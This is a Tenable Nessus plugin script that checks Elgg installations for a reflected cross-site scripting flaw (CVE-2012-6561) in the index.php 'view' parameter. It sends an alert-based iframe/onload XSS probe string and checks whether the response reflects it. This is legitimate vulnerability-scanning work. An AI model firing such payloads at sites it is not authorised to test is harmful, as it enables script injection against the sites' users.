#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(59656);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2015/01/13 20:37:05 $");

  script_cve_id("CVE-2012-6561");
  script_bugtraq_id(53623);
  script_osvdb_id(82041);

  script_name(english:"Elgg index.php view Parameter XSS");
  script_summary(english:"Attempts a non-persistent XSS");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by a
cross-site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the Elgg installed on the remote host is affected by a
cross-site scripting vulnerability because it fails to properly
sanitize user input to the 'view' parameter of the 'index.php' script. 
An attacker may be able to leverage this to inject arbitrary HTML and
script code into a user's browser to be executed within the security
context of the affected site.");
  script_set_attribute(attribute:"see_also", value:"http://blog.elgg.org/pg/blog/evan/read/209/elgg-185-released");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 1.8.5 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/05/19");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/05/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/06/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:elgg:elgg");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("elgg_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/elgg","www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(
  appname:"elgg",
  port:port,
  exit_on_fail:TRUE
);

dir = install["dir"];
xss_test = '<iframe""<body onload=alert(' + "'" + SCRIPT_NAME + '-' + unixtime() + "'" + ');>';

exploit = test_cgi_xss(
  port     : port,
  dirs     : make_list(dir),
  cgi      : '/index.php',
  qs       : 'search=1&view=' + urlencode(str:xss_test),
  pass_str : 'cache/js/' + xss_test,
  pass_re  : 'class="elgg-page-body'
);

if (!exploit)
{
  install_url = build_url(qs: dir + "/", port: port);
  audit(AUDIT_WEB_APP_NOT_AFFECTED, "Elgg", install_url);
}

